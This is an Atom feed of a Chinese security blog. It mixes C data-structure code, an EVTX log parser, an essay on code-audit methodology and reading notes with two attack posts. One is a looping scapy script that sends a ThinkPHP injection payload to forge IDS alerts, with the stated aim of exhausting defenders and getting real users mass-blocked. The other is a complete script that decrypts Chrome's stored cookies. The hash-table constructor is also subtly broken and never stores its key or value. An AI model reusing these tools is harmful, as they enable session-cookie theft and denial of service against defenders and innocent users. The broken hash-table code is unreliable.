+#include &amp;lt;stdio.h&amp;gt;
+/* 树的节点 */
+typedef struct tree_node {
+/* 左孩子指针 */
+struct tree_node *left;
+/* 右孩子指针 */
+struct tree_node *right;
+/* 关键字 */
+char key;
+}tree_node;
+/* 创建一个节点 */
+tree_node *tree_create_node(char key)
+{
+tree_node *node = (struct tree_node*)malloc(sizeof(struct tree_node));
+if(node==NULL) return NULL;
+node-&amp;gt;key = key;
+node-&amp;gt;left = NULL;
+node-&amp;gt;right = NULL;
+return node;
+}
+/* 创建一棵二叉树 */
+tree_node *tree_create()
+{
+char str;
+tree_node *current;
+scanf(&amp;#34;%c&amp;#34;, &amp;amp;str);
+// input ABD##E##CF##G##
+if(&amp;#39;#&amp;#39; == str)
+{
+current = NULL;
+}
+else {
+current = tree_create_node(str);
+current-&amp;gt;left = tree_create();
+current-&amp;gt;right = tree_create();
+}
+return current;
+}
+/* 前序遍历 */
+void preorder_traverse1(tree_node *node)
+{
+if(node != NULL) {
+printf(&amp;#34;%c\t&amp;#34;, node-&amp;gt;key);
+preorder_traverse1(node-&amp;gt;left);
+preorder_traverse1(node-&amp;gt;right);
+}
+}
+/* 中序遍历 */
+void inorder_traverse1(tree_node *node)
+{
+if(node != NULL) {
+inorder_traverse1(node-&amp;gt;left);
+printf(&amp;#34;%c\t&amp;#34;, node-&amp;gt;key);
+inorder_traverse1(node-&amp;gt;right);
+}
+}
+/* 后序遍历 */
+void postorder_traverse1(tree_node *node)
+{
+if(node != NULL) {
+postorder_traverse1(node-&amp;gt;left);
+postorder_traverse1(node-&amp;gt;right);
+printf(&amp;#34;%c\t&amp;#34;, node-&amp;gt;key);
+}
+}
+int main() {
+/* ABD##E##CF##G## */
+tree_node *root = tree_create();
+printf(&amp;#34;\n前序遍历1:&amp;#34;);
+preorder_traverse1(root);
+printf(&amp;#34;\n\n中序遍历1:&amp;#34;);
+inorder_traverse1(root);
+printf(&amp;#34;\n\n后序遍历1:&amp;#34;);
+postorder_traverse1(root);
+printf(&amp;#34;\n&amp;#34;);
+return 0;
+}
+&lt;/code>&lt;/pre></content><category scheme="https://if1sh.com/categories/%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84/" term="数据结构" label="数据结构"/></entry><entry><title type="text">c-哈希表</title><link rel="alternate" type="text/html" href="https://if1sh.com/posts/c-%E5%93%88%E5%B8%8C%E8%A1%A8/"/><id>https://if1sh.com/posts/c-%E5%93%88%E5%B8%8C%E8%A1%A8/</id><updated>2023-01-01T18:53:09+08:00</updated><published>2022-02-13T00:00:00+00:00</published><author><name>ifish</name><uri>https://ifish.com/</uri></author><rights>[CC BY-NC-SA 4.0](https://creativecommons.org/licenses/by-nc-sa/4.0/deed.zh)</rights><summary type="html">#include &amp;lt;stdlib.h&amp;gt; #include &amp;lt;string.h&amp;gt; #include &amp;lt;stdio.h&amp;gt; typedef struct hash_node { void *key; void *val; struct hash_node *next; } hash_node; typedef struct hash_table { hash_node **table; int size; // hashmask https://its301.com/article/qing_gee/120260024 int sizemask; } hash_table; unsigned int hash_33(char *str) { unsigned int hash……</summary><content type="html">&lt;pre tabindex="0">&lt;code>#include &amp;lt;stdlib.h&amp;gt;
+#include &amp;lt;string.h&amp;gt;
+#include &amp;lt;stdio.h&amp;gt;
+typedef struct hash_node {
+void *key;
+void *val;
+struct hash_node *next;
+} hash_node;
+typedef struct hash_table {
+hash_node **table;
+int size;
+// hashmask https://its301.com/article/qing_gee/120260024
+int sizemask;
+} hash_table;
+unsigned int hash_33(char *str) {
+unsigned int hash = 5381;
+while (*str) {
+hash += (hash &amp;lt;&amp;lt; 5) + (*str++);
+}
+return (hash &amp;amp; 0x7FFFFFFF);
+}
+hash_table *hash_table_create() {
+hash_table *hashTable = (hash_table *) malloc(sizeof(hash_table));
+if (hashTable == NULL) return NULL;
+hashTable-&amp;gt;size = 1024;
+hashTable-&amp;gt;sizemask = hashTable-&amp;gt;size - 1;
+// 申请1024个节点内存,可以看作是数组
+hashTable-&amp;gt;table = (hash_node **) malloc(sizeof(hash_node *) * (hashTable-&amp;gt;size));
+if (hashTable-&amp;gt;table == NULL) return NULL;
+//数组元素置零
+memset(hashTable-&amp;gt;table, 0, sizeof(hash_node *) * (hashTable-&amp;gt;size));
+return hashTable;
+}
+//这个节点相当于是单链表
+hash_node *hash_node_create(void *key, void *val) {
+hash_node *hashNode = (hash_node *) malloc(sizeof(hash_node));
+if (hashNode == NULL) return NULL;
+hashNode-&amp;gt;next = NULL;
+hashNode-&amp;gt;val = NULL;
+hashNode-&amp;gt;key = NULL;
+return hashNode;
+}
+hash_table *hash_table_insert(hash_table *hashTable, void *key, void *val) {
+unsigned int hash = hash_33(key);
+int pos = hash &amp;amp; hashTable-&amp;gt;sizemask;
+hash_node *hashNode = hash_node_create(key, val);
+hashNode-&amp;gt;next = hashTable-&amp;gt;table[pos];
+hashTable-&amp;gt;table[pos] = hashNode;
+return hashTable;
+}
+void *get_val(hash_table *hashTable, void *key) {
+unsigned int hash = hash_33(key);
+int pos = hash &amp;amp; hashTable-&amp;gt;sizemask;
+if (hashTable-&amp;gt;table[pos] == 0) return NULL;
+hash_node *current = hashTable-&amp;gt;table[pos];
+while (current) {
+if (hash_33(current-&amp;gt;key) == hash_33(key)) {
+return current-&amp;gt;val;
+} else {
+current = current-&amp;gt;next;
+}
+}
+return NULL;
+}
+int main() {
+hash_table *hashTable = hash_table_create();
+hash_table_insert(hashTable, &amp;#34;test1&amp;#34;, &amp;#34;dsafasdfads&amp;#34;);
+puts(get_val(hashTable, &amp;#34;test1&amp;#34;));
+return 0;
+}
+&lt;/code>&lt;/pre></content><category scheme="https://if1sh.com/categories/%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84/" term="数据结构" label="数据结构"/></entry><entry><title type="text">windows evtx日志解析</title><link rel="alternate" type="text/html" href="https://if1sh.com/posts/windows-evtx%E6%97%A5%E5%BF%97%E8%A7%A3%E6%9E%90/"/><id>https://if1sh.com/posts/windows-evtx%E6%97%A5%E5%BF%97%E8%A7%A3%E6%9E%90/</id><updated>2023-01-01T18:53:09+08:00</updated><published>2022-02-09T00:00:00+00:00</published><author><name>ifish</name><uri>https://ifish.com/</uri></author><rights>[CC BY-NC-SA 4.0](https://creativecommons.org/licenses/by-nc-sa/4.0/deed.zh)</rights><summary type="html">windows evtx日志解析 在溯源过程中使用Log Parser,Event Log Explorer之类的工具需要熟悉工具的……</summary><content type="html">&lt;h1 id="windows-evtx日志解析">windows evtx日志解析&lt;/h1>
+&lt;p>在溯源过程中使用Log Parser,Event Log Explorer之类的工具需要熟悉工具的语法,有的还要收费,遇到大文件打开还会卡死&lt;/p>
+&lt;p>还是解析了在匹配所需关键信息较为方便&lt;/p>
+&lt;pre tabindex="0">&lt;code>import Evtx.Evtx as evtx
+import Evtx.Views as e_views
+def main():
+import argparse
+parser = argparse.ArgumentParser(
+description=&amp;#34;Dump a binary EVTX file into XML.&amp;#34;)
+parser.add_argument(&amp;#34;--evtx&amp;#34;, type=str,
+help=&amp;#34;Path to the Windows EVTX event log file&amp;#34;)
+args = parser.parse_args()
+try:
+with evtx.Evtx(args.evtx) as log:
+with open(&amp;#39;windows_log.xml&amp;#39;, &amp;#39;w&amp;#39;) as f:
+f.write(e_views.XML_HEADER)
+f.write(&amp;#34;&amp;lt;Events&amp;gt;&amp;#34;)
+for record in log.records():
+print(record.xml())
+f.write(record.xml())
+f.write(&amp;#34;&amp;lt;/Events&amp;gt;&amp;#34;)
+except:
+pass
+if __name__ == &amp;#34;__main__&amp;#34;:
+main()
+&lt;/code>&lt;/pre></content><category scheme="https://if1sh.com/categories/%E9%98%B2/" term="防" label="防"/><category scheme="https://if1sh.com/categories/window%E6%97%A5%E5%BF%97%E5%88%86%E6%9E%90/" term="Window日志分析" label="Window日志分析"/><category scheme="https://if1sh.com/tags/window%E6%97%A5%E5%BF%97%E5%88%86%E6%9E%90/" term="Window日志分析" label="Window日志分析"/></entry><entry><title type="text">scapy attack snort</title><link rel="alternate" type="text/html" href="https://if1sh.com/posts/scapy-attack-snort/"/><id>https://if1sh.com/posts/scapy-attack-snort/</id><updated>2023-01-01T18:53:09+08:00</updated><published>2021-11-01T00:00:00+00:00</published><author><name>ifish</name><uri>https://ifish.com/</uri></author><rights>[CC BY-NC-SA 4.0](https://creativecommons.org/licenses/by-nc-sa/4.0/deed.zh)</rights><summary type="html">hw的时候防守方都是几百号人对几支攻击队，加上内网一大堆告警设备有些烦 一个恶心流量设……</summary><content type="html">&lt;p>hw的时候防守方都是几百号人对几支攻击队，加上内网一大堆告警设备有些烦&lt;/p>
+&lt;p>一个恶心流量设备的小方法，可以通过伪造告警，耗尽防守方体力&lt;/p>
+&lt;p>还可以通过组合告警流量，来触发nids的soar，实现让他们自己封禁自己，也可以引入纯真ip池，让他们大规模封禁真实用户&lt;/p>
+&lt;p>demo&lt;/p>
+&lt;pre tabindex="0">&lt;code>#!/usr/bin/env python
+from scapy.all import *
+packet_ip = IP(src=&amp;#34;192.168.1.222&amp;#34;, dst=&amp;#34;192.168.1.143&amp;#34;)
+udp_3 = UDP(sport=4444, dport=16464)
+payload_3 = &amp;#34;index/\think\View/display&amp;amp;content=%22%3C?%3E%3C?php%20phpinfo();?%3E&amp;amp;data=18&amp;#34;
+packet_3 = packet_ip / udp_3 / payload_3
+packets = [packet_3]
+send(packets, loop=1)
+&lt;/code>&lt;/pre></content><category scheme="https://if1sh.com/categories/%E6%94%BB/" term="攻" label="攻"/></entry><entry><title type="text">chrome解密</title><link rel="alternate" type="text/html" href="https://if1sh.com/posts/chrome%E8%A7%A3%E5%AF%86/"/><id>https://if1sh.com/posts/chrome%E8%A7%A3%E5%AF%86/</id><updated>2023-01-01T18:53:09+08:00</updated><published>2021-10-28T00:00:00+00:00</published><author><name>ifish</name><uri>https://ifish.com/</uri></author><rights>[CC BY-NC-SA 4.0](https://creativecommons.org/licenses/by-nc-sa/4.0/deed.zh)</rights><summary type="html">chrome解密 &amp;#34;&amp;#34;&amp;#34; 1：获取local state文件位置 2：获取加密的key(base……</summary><content type="html">&lt;h1 id="chrome解密">chrome解密&lt;/h1>
+&lt;pre tabindex="0">&lt;code>&amp;#34;&amp;#34;&amp;#34;
+1：获取local state文件位置
+2：获取加密的key(base64编码)
+3：DPAPI解密
+4：ase-gcm解密
+5：解析sqllite文件
+&amp;#34;&amp;#34;&amp;#34;
+import os
+import json
+import base64
+import win32crypt
+import sqlite3
+from cryptography.hazmat.primitives.ciphers.aead import AESGCM
+def AESGCM_decode(key, data):
+# 5.ase-gcm解密
+nonce, cipherbytes = data[3:15], data[15:]
+aesgcm = AESGCM(key)
+plainbytes = aesgcm.decrypt(nonce, cipherbytes, None)
+plaintext = plainbytes.decode(&amp;#39;utf-8&amp;#39;)
+return plaintext
+def get_key():
+# 1.获取key
+LocalState = os.path.join(os.environ[&amp;#39;LOCALAPPDATA&amp;#39;], r&amp;#34;Google\Chrome\User Data\Local State&amp;#34;) # 密钥文件
+with open(LocalState, &amp;#39;r&amp;#39;, encoding=&amp;#39;utf-8&amp;#39;) as f:
+s = json.load(f)[&amp;#39;os_crypt&amp;#39;][&amp;#39;encrypted_key&amp;#39;]
+# 2.解密base64
+encrypted_key_with_header = base64.b64decode(s)
+# print(encrypted_key_with_header)
+# 3.去除头5位的DPAPI
+encrypted_key = encrypted_key_with_header[5:]
+key = win32crypt.CryptUnprotectData(encrypted_key, None, None, None, 0)[1]
+return key
+def get_cookie():
+Cookies = os.path.join(os.environ[&amp;#39;USERPROFILE&amp;#39;],
+r&amp;#39;AppData\Local\Google\Chrome\User Data\default\Cookies&amp;#39;) # cookie文件
+con = sqlite3.connect(Cookies)
+res = con.execute(&amp;#39;select host_key,name,encrypted_value from cookies&amp;#39;).fetchall()
+con.close()
+key = get_key()
+for i in res:
+print(i[2])
+print(i[0], i[1], AESGCM_decode(key, i[2]))
+if __name__ == &amp;#39;__main__&amp;#39;:
+get_cookie()
+&lt;/code>&lt;/pre></content><category scheme="https://if1sh.com/categories/%E6%94%BB/" term="攻" label="攻"/></entry><entry><title type="text">代码审计方法论</title><link rel="alternate" type="text/html" href="https://if1sh.com/posts/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1%E6%96%B9%E6%B3%95%E8%AE%BA/"/><id>https://if1sh.com/posts/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1%E6%96%B9%E6%B3%95%E8%AE%BA/</id><updated>2023-01-01T18:53:09+08:00</updated><published>2021-02-16T00:00:00+00:00</published><author><name>ifish</name><uri>https://ifish.com/</uri></author><rights>[CC BY-NC-SA 4.0](https://creativecommons.org/licenses/by-nc-sa/4.0/deed.zh)</rights><summary type="html">代码审计方法论 一、定义 软件代码审计是在一个编程中对源代码旨在发现错误、安全漏洞或违反……</summary><content type="html">&lt;h1 id="代码审计方法论">代码审计方法论&lt;/h1>
+&lt;p>一、定义&lt;/p>
+&lt;p>软件代码审计是在一个编程中对源代码旨在发现错误、安全漏洞或违反编程约定的项目。它是防御性程序设计范例，它试图在软件发布之前减少错误。C、C++、php源代码是最常见的审计代码，因为许多高级语言，如Python，具有较少的潜在易受攻击的函数（例如，不检查边界的函数）——维基百科&lt;/p>
+&lt;p>代码检查是审计工作中最常用的技术手段，实际应用中，采用“自动分析+人工验证”的方式进行。通常检查项目包括:系统所用开源框架、源代码设计、错误处理不当、直接对象引用、资源滥用、API滥用、后门代码发现等，通常能够识别如下代码中的风险点：&lt;/p>
+&lt;p>跨站脚本漏洞、跨站请求伪装漏洞、SQL注入漏洞、命令执行漏洞、日志伪造漏洞、参数篡改、密码明文存储、配置文件缺陷、路径操作错误、资源管理、不安全的Ajax调用、系统信息泄露、调试程序残留、第三方控件漏洞、文件上传漏洞、远程命令执行、远程代码执行、越权下载、授权绕过漏洞。&lt;/p>
+&lt;p>二、问题&lt;/p>
+&lt;p>1、代码与架构复杂&lt;/p>
+&lt;p>几十万、几百万行代码、一个业务分几十个模块几十个代码仓库家常便饭；开发语言多种多样，各种自研框架、流行框架应接不暇、架构还非常复杂。&lt;/p>
+&lt;p>以上两个问题对审计人员、SAST工具来说无疑都是很大的挑战。&lt;/p>
+&lt;p>2、工具准召率&lt;/p>
+&lt;p>没有工具是所谓银弹，官方规则、插件准召率很低，需要根据开发语言、编码风格自定义；工具对逻辑漏洞的无力，与业务逻辑漏洞大量曝光的漏洞态势之间的矛盾，工具、系统的运营也需要专门人力投入，从而不断提高工具的准召率。&lt;/p>
+&lt;p>心态
+审计人员出于KPI的考虑，想着既然花了很长时间做了代码审计，为了体现工作量就必须说点什么，如果系统本来没有问题却在那挑刺，开发者会更加不信任你。对于甲方代码审计人员，审计任务多、代码庞大是常态，如果不考虑后果的只提高速度，这种方式会遗漏掉细节，导致不能全面的审查。&lt;/p>
+&lt;p>三、审计整体思路&lt;/p>
+&lt;p>准备工作
+获得源码
+　　要审计当然要先获得相应的源码，最好有相关文档等，资料越多越易于理解源码。&lt;/p>
+&lt;p>安装网站
+　　在本地搭建网站，一边审计一边调试。通过跟踪各种动态变化了解源码的作用。&lt;/p>
+&lt;p>网站结构
+　　浏览源码文件夹，了解该程序的大致目录&lt;/p>
+&lt;p>入口文件
+index、admin文件一般是整个程序的入口，详细读一下index文件可以知道程序的架构、运行流程、包含那些配置文件，包含哪些过滤文件以及包含那些安全过滤文件，了解程序的业务逻辑。&lt;/p>
+&lt;p>配置文件
+　　一般类似config等文件，保存一些数据库相关信息、程序的一些信息。先看看数据库编码，如果是gbk则可能存在宽字节注入。如果变量的值用双引号、则可能存在双引号解析代码执行的问题。&lt;/p>
+&lt;p>过滤功能
+通过详读 公共函数文件 和 安全过滤文件 等文件，清晰掌握用户输入的数据，哪些被过滤，哪些无过滤，在哪里被过滤了，如何过滤的，能否绕过过滤的数据。过滤的方式是替换还是正则？有没有GPC？有没有使用addslasher()处理？&lt;/p>
+&lt;p>2、审计方法&lt;/p>
+&lt;p>2.1、自动手动结合&lt;/p>
+&lt;p>代码扫描工具-&amp;gt;ast/正则表达式-&amp;gt;复核&lt;/p>
+&lt;p>词法分析-&amp;gt;语法分析-&amp;gt;（语义分析-&amp;gt;中间代码）-&amp;gt;AST&lt;/p>
+&lt;p>按照预定的规则合并成一个个的标识tokens。同时，它会移除空白符，注释，等。最后，整个代码将被分割进一个tokens列表（或者说一维数组）。将词法分析出来的数组转化成树形的表达形式。同时，验证语法，语法如果有错的话，抛出语法错误。解析器会删除一些没必要的标识tokens（比如不完整的括号），因此AST不是100%与源码匹配的，解析器100%覆盖所有代码结构生成树叫做CST（具体语法树）。以下介绍一些主流web开发语言的ast parser：&lt;/p>
+&lt;p>• 在线parser&lt;/p>
+&lt;p>• php-parsesr&lt;/p>
+&lt;p>• python-parser&lt;/p>
+&lt;p>• go-parser&lt;/p>
+&lt;p>• js-parser&lt;/p>
+&lt;p>• java-parser&lt;/p>
+&lt;p>结合开源、商业sast工具进行漏洞和风险扫描输出初步检测报告，然后人工复核准确性，不断优化sast扫描规则，同时提高漏洞挖掘速度。&lt;/p>
+&lt;p>2.2、黑白盒结合&lt;/p>
+&lt;p>黑盒求覆盖-&amp;gt;白盒求重点&lt;/p>
+&lt;p>通过黑盒来全部覆盖所有业务cgi，同时通过白盒测试覆盖重要业务cgi，黑盒快速验证、白盒挖掘根因或者研究绕过策略，从而实现实现效率与重要性的平衡。另外，这里建议使用被动扫描器进行快速流量回放，实现流量采集与漏洞测试的同步执行，大大提高测试效率。同时也建议将cgi与功能整理出来，不然白盒审计在理解业务和代码逻辑上的成本会非常高。&lt;/p>
+&lt;p>2.3、正反向跟踪&lt;/p>
+&lt;p>• 正向：变量-&amp;gt;函数/敏感操作-&amp;gt;输出&lt;/p>
+&lt;p>$_GET-&amp;gt;$param-&amp;gt;eval($param)-&amp;gt;return $param&lt;/p>
+&lt;p>从参数接收入口开始跟踪数据流，是一种正向追踪的思路。优点是方便理解程序整体框架，相对容易定位逻辑漏洞。但是在代码量较大、代码结构化不强的情况下人工审计成本很高，ROI可能不明显，这种情况下结合SAST工具进行审计效果会更好。&lt;/p>
+&lt;p>• 反向：函数/敏感操作回溯-&amp;gt;输出&lt;/p>
+&lt;p>eval($param)-&amp;gt;$param-&amp;gt;$GET-&amp;gt;return $param&lt;/p>
+&lt;p>根据敏感关键字来回溯传入的参数，是一种逆向追踪的思路。优点是仅需要搜索相应敏感关键字，就可以快速挖掘漏洞，可定向挖掘，高效，高质量，但也因为没有通读代码，对程序整体框架不熟悉，定位时会花费时间，逻辑漏洞挖掘较为困难。同理，这种情况下也需要结合SAST工具来做，因为SAST工具对敏感函数的控制流跟踪效果较好，方便人工后续回溯变量。&lt;/p>
+&lt;p>2.4、动静结合&lt;/p>
+&lt;p>（1）静态审计&lt;/p>
+&lt;p>通过静态分析源码，发现源码中的逻辑、数据处理、函数使用不当来确认源码中可能存在的漏洞。可以通过规则匹配和代码解析法开展，不过这块可以交给SAST工具去做。&lt;/p>
+&lt;p>（2）规则匹配&lt;/p>
+&lt;p>通过编写正则表达式匹配开发语言或者开发框架的默认变量与高危函数进行匹配，比如php的默认变量$GET、$POST，高危函数eval()、exec()等。&lt;/p>
+&lt;p>（3）代码解析法&lt;/p>
+&lt;p>通过解析代码的语法，分析出代码执行流程，这块如果采用自动化手段便属于前文所说AST，所以说不同思路之间也有相通之处。&lt;/p>
+&lt;p>（4）动态审计&lt;/p>
+&lt;p>通过运行需要审计的代码，结合使用断点调试的方法跟踪数据的流转来判断系统中是否存在漏洞。这块可以交给DAST或者IAST工具去做。注意一开始只需要关注我们关心的漏洞类型：高危文件、高危函数以及常规Web漏洞。&lt;/p>
+&lt;p>2.5、过往与当下结合&lt;/p>
+&lt;p>• 是否采用存在漏洞的框架版本；&lt;/p>
+&lt;p>• 是否出自同一个存在不良编码习惯或安全意识薄弱的开发者之手；&lt;/p>
+&lt;p>• 是否出现过漏洞，可能没彻底修复或者其他业务有类似的问题；&lt;/p>
+&lt;p>• 这个功能、模块、类、函数出现的漏洞是否可能出现在其他功能模块、类函数。&lt;/p>
+&lt;p>2.6、checklist与安全编码规范结合&lt;/p>
+&lt;p>梳理常见漏洞场景、常见漏洞类型、常见功能安全编码模板，对比实现方式，编码规范可以参考《OWASP安全编码规范》，相关checklist可以下一部分的内容。&lt;/p>
+&lt;p>2.7、通读与走读结合&lt;/p>
+&lt;p>类似英语阅读文章的阅读技巧，先粗略读一遍，再根据漏洞类型与业务场景跳着读。&lt;/p>
+&lt;p>• 首先要看程序的大体代码结构&lt;/p>
+&lt;p>如主目录有哪些文件，模块目录有哪些文件，插件目录有哪些文件，除了关注有哪些文件，还要注意文件的大小、创建时间。查看版本管理历史记录，大概了解整套代码更新迭代过程。&lt;/p>
+&lt;p>• 关注框架文件、核心功能&lt;/p>
+&lt;p>函数集文件（公共库类函数）、配置文件（看单引号、双引号，看全局配合或者路由）、安全过滤文件（防护代码）、index文件（入口文件），也看身份认证、权限控制、数据库操作、文件上传之类的核心功能实现逻辑。&lt;/p>
+&lt;p>四、业务落地&lt;/p>
+&lt;p>1、依赖代码仓库和业务基础信息&lt;/p>
+&lt;p>（1）安全资产管理：进行代码审计前必须有完善的资产大盘，了解业务、责任人、组织架构的对应关系，这样才能在明确安全态势的基础上选择代码审计的对象、优先级、方法、手段；&lt;/p>
+&lt;p>（2）代码获取：明确审计对象后，需要通过资产大盘找到开发团队，通过代码仓库的权限申请流程获取代码；&lt;/p>
+&lt;p>（3）架构、cgi接口、业务逻辑 审计前需要了解业务架构来初步评估审计范围，了解cgi接口和业务逻辑可加快审计速度，快速定位漏洞和风险。&lt;/p>
+&lt;p>2、平台化建设&lt;/p>
+&lt;p>不断增多的代码以及架构的复杂性决定了代码审计必须走平台化建设道路，通过将SAST工具与CI系统打通，实现自动化漏洞扫描，在发现漏洞后可自动创建漏洞工单，并按照已有的审计流程进行复核以及开展人工审计。&lt;/p>
+&lt;p>（1）CI系统与SAST工具：例如SAST工具SonarQube及其插件Find Security Bug与CI系统Jenkins就是一套低成本的实现方案；&lt;/p>
+&lt;p>（2）漏洞管理系统(JIRA)：进入到代码审计阶段的企业，通常已经有相对完善的漏洞管理系统和工单处理流程，可以将SAST生成的报表解析、过滤后再推到漏洞管理系统；&lt;/p>
+&lt;p>（3）审计流程管理：这块主要明确审计过程的任务跟踪、检查覆盖率、ROI评价。&lt;/p>
+&lt;p>五、审计技巧&lt;/p>
+&lt;p>1、如何快速看懂代码&lt;/p>
+&lt;p>简单来说，便是关注开发模式、开发框架，读尽可能少的代码、从路由与cgi的映射关系入手，结合IDE去阅读代码。&lt;/p>
+&lt;p>（1）用mvc或者mvvm架构思维去理解：大部分web系统都是按照model（数据库模型）-view（用户交互）-controller（后台业务逻辑）的架构去设计开发的，近年来越来越流行的mvmm（model-view-viewmodel）架构也是在此基础上演变而来，两种区别在于mvvm的ViewControl抽离了mvc的Controller中的业务逻辑，实现业务逻辑组件的复用。审计时可以直接去Controller或者ViewModel中找相应的业务逻辑；&lt;/p>
+&lt;p>（2）区分前后端代： 前后端分离也是近年来流行的开发模式，前端部分通常只会出现xss漏洞，通过区分前后端代码，可以避免在前端代码部分浪费时间去定位sql注入、越权漏洞之类的后端逻辑才会出现的漏洞；&lt;/p>
+&lt;p>（3）先找路由与逻辑代码对应关系：路由通常出现在配置或者mvc架构的controller中，通过文件目录或者类函数的public属性来定位，或者在url路由表中直接定义；&lt;/p>
+&lt;p>（4）论IDE的重要性：IDE通常会显示类或者函数的Definition和Reference，通过链接可以快速跟踪代码调用，也可以使用内嵌的搜索功能快速定位关键字，比起命令行下查找关键字方便很多。&lt;/p>
+&lt;p>2、业务思维&lt;/p>
+&lt;p>这里强调业务思维，是说越了解业务，越能从开发者和用户角度去思考设计和使用上可能存在的安全问题，对逻辑漏洞挖掘非常重要。&lt;/p>
+&lt;p>（1）让业务提供应用程序的设计文档、架构文档，以便从功能上快速理解业务逻辑；&lt;/p>
+&lt;p>（2）始终记住用户可以控制请求的每一个方面，他们可以按照任意顺序访问多阶段功能，可以提交畸形数据，可以忽略某些参数，可以伪造某些参数，可以修改某些参数。因此在设计的时候一定尽可能要面面俱到；&lt;/p>
+&lt;p>（3）从各个角度考虑两个因素：应用程序如何处理用户的反常操作和输入的，不同代码组件与应用程序功能之间的相互依赖操作可能造成不利影响；&lt;/p>
+&lt;p>（4）考虑设计过程中做的每一个假设，并想象假设被违背的每种情况，尤其注意用户可以完全控制的假设条件。&lt;/p>
+&lt;p>3、如何提高准召率&lt;/p>
+&lt;p>主要关于如何提高准确性和完整性的问题。&lt;/p>
+&lt;p>（1）现代编程中关注代码调度、脚手架、统一框架、高度封装的问题：过滤和预编译等安全防护都在框架层或者公共class/function完成的可忽略；&lt;/p>
+&lt;p>（2）传入危险函数的参数用户不可控的可忽略；&lt;/p>
+&lt;p>（3）依赖组件扫描只是提供一种思路或者缩小审计范围，工具扫出后需要复核，如何存在问题的函数或者类业务并没有使用，不作为漏洞，只作风险提醒；&lt;/p>
+&lt;p>（4）接入层已使用https的，不需要关注HSTS等安全header异常，但仍建议程序自行配置安全header，特别是secure/httponly/X-Content-Type-Options:nosniff等不适合在接入层统一配置的；&lt;/p>
+&lt;p>（5）对于常见的应用场景，如文件操作、命令行操作、数据库操作、用户权限及认证等，我们需要了解框架的实现，给出相应的安全编码范例。框架文档中给出的例子并不一定就是最好的。安全侧必须对开发进行安全意识的培训，让他知道如何利用框架的API去安全的组合出常用功能。&lt;/p>
+&lt;p>对于应用漏洞挖掘，我们需要扩充字典。框架的封装，可能引入更多的危险API或危险特性。在代码审计的过程中，需要将这些内容加入到危险词字典中。&lt;/p></content><category scheme="https://if1sh.com/categories/code-audit/" term="Code Audit" label="Code Audit"/><category scheme="https://if1sh.com/tags/%E6%96%B9%E6%B3%95%E8%AE%BA/" term="方法论" label="方法论"/></entry><entry><title type="text">阅读一本书</title><link rel="alternate" type="text/html" href="https://if1sh.com/posts/%E9%98%85%E8%AF%BB%E4%B8%80%E6%9C%AC%E4%B9%A6/"/><id>https://if1sh.com/posts/%E9%98%85%E8%AF%BB%E4%B8%80%E6%9C%AC%E4%B9%A6/</id><updated>2023-01-01T18:53:09+08:00</updated><published>2021-02-16T00:00:00+00:00</published><author><name>ifish</name><uri>https://ifish.com/</uri></author><rights>[CC BY-NC-SA 4.0](https://creativecommons.org/licenses/by-nc-sa/4.0/deed.zh)</rights><summary type="html">如何阅读一本书 阅读分为四个层次：基础阅读、检视阅读、分析阅读、主题阅读 基础阅读 最基本……</summary><content type="html">&lt;h1 id="如何阅读一本书">如何阅读一本书&lt;/h1>
+&lt;p>阅读分为四个层次：基础阅读、检视阅读、分析阅读、主题阅读&lt;/p>
+&lt;h2 id="基础阅读">基础阅读&lt;/h2>
+&lt;p>最基本的听说读写能力&lt;/p>
+&lt;h2 id="检视阅读">检视阅读&lt;/h2>
+&lt;h3 id="检视阅读的方式">检视阅读的方式&lt;/h3>
+&lt;ol>
+&lt;li>通过前言、目录、索引（可能关系到作者的价值取向）、出版介绍这四个方向来快速阅读&lt;/li>
+&lt;li>快速的阅读，看不懂的就过，不要纠结，等到读第二遍的时候在回顾难点（这是检视阅读最最重要的规则？）&lt;/li>
+&lt;/ol>
+&lt;h3 id="检视阅读的速度">检视阅读的速度&lt;/h3>
+&lt;p>要知道什么时候用什么样的速度是恰当的&lt;/p>
+&lt;h3 id="逗留与倒退">逗留与倒退&lt;/h3>
+&lt;p>&lt;strong>眼睛在阅读的时候移动，是会造成跳字看的情况，看着看着又会倒退到原点&lt;/strong>&lt;/p>
+&lt;p>神奇的大脑会根据这些句子来生成信息，例如下面：
+即便是成语，也都是四个字的，所以随意颠倒顺序，都能看得懂。
+你现在看的到句这话就是颠顺倒序的。&lt;/p>
+&lt;p>如何矫正阅读速度？
+拿着笔顺着字一行一行的移动下去，一旦你的眼睛能跟着手移动时，你就能读到那些句子了&lt;/p>
+&lt;h2 id="主动阅读">主动阅读&lt;/h2>
+&lt;p>在阅读过程提出问题，并且尝试解决问题&lt;/p>
+&lt;h3 id="提出问题">提出问题&lt;/h3>
+&lt;ol>
+&lt;li>这本书到底在谈什么？一定要想办法找到书的主题，作者如何依次发展这个主题，如何从主题分解出从属的关键议题&lt;/li>
+&lt;li>作者细节说了什么？怎么说的？一定要想办法找到作者的想法、论点&lt;/li>
+&lt;li>这本书说的有道理吗？&lt;/li>
+&lt;li>这本书跟我有什么关系？&lt;/li>
+&lt;/ol>
+&lt;h3 id="回答问题">回答问题&lt;/h3>
+&lt;p>在书上做笔记，其实就是在表达你跟作者之间相依或者相同的观点&lt;/p>
+&lt;p>做笔记的标识：&lt;/p>
+&lt;ol>
+&lt;li>画底线，表示重要&lt;/li>
+&lt;li>画双重底线，表示更加重要&lt;/li>
+&lt;li>使用星号，标记一个重要大段落&lt;/li>
+&lt;li>使用问号，表示疑问&lt;/li>
+&lt;li>使用编号，标记作者的论述&lt;/li>
+&lt;/ol>
+&lt;h2 id="分析阅读">分析阅读&lt;/h2>
+&lt;ol>
+&lt;li>分析阅读首先就是要知道你在读什么书，先给书分类一下，分出工具书和理论书&lt;/li>
+&lt;li>使用简单的话来叙述整本书的内容&lt;/li>
+&lt;li>把书重要的篇章列出来，是按照什么顺序组成的整体架构&lt;/li>
+&lt;li>知道作者的问题，一本书可能有一个答案，可能有多个答案，也可能没有答案&lt;/li>
